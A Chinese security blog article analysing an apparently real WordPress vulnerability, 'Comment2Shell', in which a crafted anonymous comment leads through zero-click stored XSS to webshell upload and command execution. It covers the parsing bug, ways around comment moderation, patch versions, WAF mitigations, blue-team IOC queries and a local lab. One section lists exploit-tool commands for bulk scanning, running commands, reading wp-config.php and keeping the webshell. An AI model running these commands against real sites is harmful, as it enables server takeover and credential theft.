#  WordPress Comment2Shell漏洞分析：一条评论如何变成服务器RCE  
原创 Dr. Clay
                    Dr. Clay  黑白之道   2026-09-27 01:10  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6PDzLztjT9LBBoqRhgmfbkzpWTvI6hC6AqHdQ6sliaQgGib44qL2eSX2u93wtknicU3U3mAcOB93YicZsZu2pNrmJic1X2KPKmc9Bnk/640?from=appmsg "")  
> **导语**  
：WordPress的评论系统是博客生态的血液，但谁能想到——攻击者只需在评论框里填一段特殊构造的文本，等管理员打开文章看了一眼，整套攻击链就自动跑完：植入XSS→劫持管理员会话→上传Webshell→执行任意命令→Shell自毁消除痕迹。这就是CVE-2026-93485，被安全圈称为"Comment2Shell"的高危漏洞。  
  
## 一、漏洞概述  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">项目</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">详情</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE编号</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE-2026-93485</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVSS评分</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.1（中危）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">影响范围</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">WordPress 4.7 ~ 7.1（含）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">漏洞类型</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">预认证存储型XSS → RCE</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.1.1（并向后移植至25个分支，最低至4.7.36）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">披露时间</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">2026年9月17日（修复）；研究者Rafie Muhammad于9月21日公开完整技术分析</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">利用前提</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评论功能开启 + 管理员查看文章</span></section></td></tr></tbody></table>  
该漏洞的特殊之处在于：**零点击、预认证、核心代码级**  
。攻击者不需要任何账号，不需要诱骗管理员点击任何东西，只要评论能展示在页面上就够了。  
## 二、攻击链完整解析  
  
整个攻击链路分为五个阶段，以下逐帧拆解。  
### 第一步：构造恶意评论（匿名提交，无需认证）  
  
攻击者以匿名用户身份提交如下评论 payload：  
```
<blockquote cite="ab"><code>x" onfocus=... autofocus>
```  
  
关键在于 blockquote  
 的 cite  
 属性中插入了换行符。这个 payload 看起来完全无害——WordPress的KSES过滤器允许 blockquote[cite]  
 和 code  
 标签，换行符本身不会被过滤。  
### 第二步：wpautop() 显示时过滤链失效（核心bug）  
  
问题出在 wp-includes/formatting.php  
 第563行的 wpautop()  
 函数。该函数的正则表达式如下：  
```
preg_replace('|<p><blockquote([^>]*)>|', '<blockquote$1><p>', ...)
```  
  
其中 [^>]*  
 这个字符类会在遇到第一个 >  
 时停止匹配。然而，攻击者精心设计的换行让 <blockquote cite="a  
 后面的那个 >  
 被解释为标签结束，而实际的 >  
 还藏在 <!-- wpnl -->  
 HTML注释之后。  
  
结果：<p>  
 标签被错误地注入到 cite  
 属性的**内部**  
，最终在浏览器解析时变成：  
```
<blockquote cite="a<p onfocus=... autofocus>">
```  
### 第三步：wptexturize() 密封属性  
  
这一步在区块主题（Block Theme）下触发。wptexturize()  
 会把外层的直引号 "  
 变成弯引号 "  
（ curly quote），而 <code>  
 内部的引号因为在 no-texturize 列表中而保持不变。浏览器解析时，属性边界被破坏，onfocus  
 和 autofocus  
 正式成为可用属性。  
### 第四步：零点击XSS触发  
  
autofocus  
 属性使得 onfocus  
 事件在页面加载时**自动触发**  
，无需任何点击。JavaScript在管理员的浏览器会话中执行，拥有管理员的全部权限。  
### 第五步：利用管理员会话上传Webshell → RCE  
  
有了管理员会话，攻击者的JavaScript可以：  
1. 访问 /wp-admin/plugin-install.php  
，提取上传用的nonce  
  
1. 在浏览器内存中动态构造ZIP文件（插件格式，包含webshell）  
  
1. POST到 /wp-admin/update.php?action=upload-plugin  
  
1. Webshell落地于 wp-content/plugins/<随机目录>/<随机文件>.php  
  
1. GET请求该webshell执行命令（例如 ?c=id  
），结果回显在浏览器Tab标题  
  
执行完成后，webshell接收 ?d=1  
 参数会**自毁**  
——删除自身PHP文件和插件目录，不留持久化痕迹。  
  
![Comment2Shell攻击链演示：匿名评论→管理员触发→webshell上传→命令执行](https://mmbiz.qpic.cn/mmbiz_gif/nGzNudUIJ6Mgu4ycMLJ6dCIibFmibkK3Foiau3MGzpPGa20q660pGZ8kYWKS6FbIlfhTWWSKSDsVedCz2hKW0hulIOCDadpZ8mTaWKglzeQRv4/640?from=appmsg "Comment2Shell攻击链演示：匿名评论→管理员触发→webshell上传→命令执行")  
> 官方PoC演示：WordPress 7.1.0下，匿名评论植入payload，管理员打开文章自动触发零点击XSS，webshell上传后执行id  
命令，Tab标题返回结果，shell自删除。  
  
## 三、攻击前提与约束  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">条件</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评论开放</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">文章开启评论功能（默认开启）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">匿名评论允许</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">comment_registration=0</span></code><section><span leaf="">（默认）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">区块主题</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">自Twenty Twenty-Two起成为默认主题</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">管理员访问</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">需有管理员在登录状态下打开带毒文章</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">评论需展示</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">新评论者评论默认需审批，但存在绕过方式</span></section></td></tr></tbody></table>  
**绕过评论审批的三种路径**  
：  
- **已知评论者**  
：WordPress默认允许"WordPress Commenter"（wapuu@wordpress.example）免审批  
  
- **关闭审批**  
：若 comment_previously_approved=0  
，任何身份自动审批  
  
- **作者预览**  
：先评论者可通过 ?unapproved=<id>&moderation-hash=<hash>  
 预览pending评论  
  
> 正如Patchstack所述："**Moderation isn't a security control**  
"（审批不是安全控制手段）。  
  
## 四、影响版本与修复方案  
### 受影响版本  
  
WordPress 4.7.0 ~ 7.1.0（全部受影响）  
### 修复版本对照表  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">当前分支</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">最低修复版本</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.1.x</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.1.1</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.0.x</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">7.0.5</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">6.9.x</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">6.9.8</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">4.7.x ~ 6.8.x</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">各分支最新安全版本，最低至 4.7.36</span></section></td></tr></tbody></table>### 紧急缓解措施（若无法立即升级）  
1. 全站关闭评论功能  
  
1. 部署WAF规则，拦截含 blockquote cite=  
 和换行符的请求  
  
1. 切换至经典主题（部分可缓解）  
  
## 五、检测与验证方法  
### 5.1 使用Comment2Shell工具集检测  
```
# 克隆项目git clone https://github.com/DeathShotXD/Comment2Shell.gitcd Comment2Shell# 版本扫描（被动检测目标WordPress版本）python3 comment2shell.py --scan -t https://target.com# 批量扫描python3 comment2shell.py --scan -f targets.txt --threads 20# 发送无害XSS探测payload（仅触发alert，不上传shell）python3 comment2shell.py --probe -t https://target.com# 带OAST回调查询python3 comment2shell.py --probe -t https://target.com \  --callback https://your-id.oast.example
```  
### 5.2 完整利用（需管理员会话）  
```
# 执行命令后自动删除webshellpython3 comment2shell.py -t https://target.com -c "id"# 读取wp-config.phppython3 comment2shell.py -t https://target.com -c "cat wp-config.php"# 保留webshell（不删除）python3 comment2shell.py -t https://target.com -c "id" --no-cleanup# 使用已知shell路径python3 comment2shell.py --exec -t https://target.com \  --shell-path ab12cd/ab12cd.php -c "cat wp-config.php"
```  
### 5.3 蓝队IOC排查  
```
# 查看可疑评论mysql -e "SELECT comment_ID, comment_author, LEFT(comment_content,200) \ FROM wp_comments WHERE comment_content LIKE '%blockquote%cite%\ onfocus%' ORDER BY comment_date DESC;"# 查找近期上传的单文件插件find /var/www/html/wp-content/plugins/ -maxdepth 2 -name "*.php" \ -newer /var/www/html/wp-config.php -not -path "*/akismet/*" \ -not -path "*/hello*""
```  
### 5.4 Nuclei模板检测  
  
项目自带Nuclei模板，可集成到扫描流水线中：  
```
# 项目内包含 nuclei/templates/comment2shell.yamlnuclei -t nuclei-templates/ -l targets.txt
```  
## 六、本地靶场复现  
```
cd Comment2Shell/dockerdocker compose up -dbash setup.sh# 目标地址：http://localhost:80# 管理员账号：admin / Password123!# 测试命令：python3 comment2shell.py -t http://localhost -c "id"
```  
## 七、技术总结与未来趋势  
  
Comment2Shell的精妙之处在于**利用了两个安全检查之间的时间窗口**  
——KSES在保存时过滤，wpautop()在显示时重新格式化，而这两步之间的处理逻辑不一致产生了注入点。这不是业务逻辑漏洞，而是WordPress渲染管道多年积累的技术债务。  
  
**未来趋势**  
：  
- 类似显示时过滤链漏洞可能存在于其他CMS平台  
  
- 随着WAF规则完善，攻击者会更依赖浏览器原生解析差异（mismatch-based XSS）  
  
- 自动化工具降低了RCE利用门槛，但蓝队的检测和响应速度同样在加速  
  
**版权声明**  
：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6PkeJXy864xufxxeHBWLbnu24icbhVhibRflWufxcHVdrDpANQanDEzqiagqT5nib9WIyaGavapgmicw0gY4G9outIoaliaOgmgm3FQo/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
